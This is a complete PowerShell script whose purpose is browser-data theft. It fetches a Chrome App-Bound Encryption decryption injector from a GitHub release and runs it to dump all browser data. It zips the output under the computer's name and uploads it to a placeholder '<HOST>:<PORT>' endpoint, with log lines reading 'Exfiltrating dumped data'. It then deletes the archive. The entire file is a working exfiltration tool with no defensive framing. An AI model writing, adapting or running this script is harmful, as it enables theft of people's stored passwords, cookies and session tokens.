function Upload-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        [string]$Url
    )

    if (!(Test-Path $FilePath)) {
        throw "File not found: $FilePath"
    }

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $fileName = [System.IO.Path]::GetFileName($FilePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

    $header = (
        "--$boundary$LF" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF" +
        "Content-Type: application/octet-stream$LF$LF"
    )

    $footer = "$LF--$boundary--$LF"

    $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($header)
    $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

    $ms = New-Object System.IO.MemoryStream
    $ms.Write($headerBytes, 0, $headerBytes.Length)
    $ms.Write($fileBytes, 0, $fileBytes.Length)
    $ms.Write($footerBytes, 0, $footerBytes.Length)

    Invoke-RestMethod -Uri $Url `
        -Method Post `
        -ContentType "multipart/form-data; boundary=$boundary" `
        -Body $ms.ToArray()
}

Write-Host "[i] Declaring Variables"

$tempDir = $env:TEMP
$zipPath = Join-Path $tempDir "downloaded.zip"
$zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.20.0/chrome-injector-v0.20.0.zip"
$extractPath = Join-Path $tempDir "extracted"
$outData = Join-Path $HOME "data"
$chromelevator = Join-Path $extractPath "chromelevator_x64.exe"
$exfil = Join-Path $HOME "$env:COMPUTERNAME.zip"

if (!(Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath | Out-Null
}

Write-Host "[i] Pulling executables"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

Remove-Item $zipPath -Force

Write-Host "[+] Starting chromelevator_x64.exe"
& "$chromelevator" all -o $outData
Compress-Archive -Path $outData -DestinationPath $exfil

Write-Host "[+] Exfiltrating dumped data"
Upload-File -FilePath $exfil -Url "http://<HOST>:<PORT>/"

Write-Host "[+] Done dumping browser data.."

Remove-Item $exfil -Force
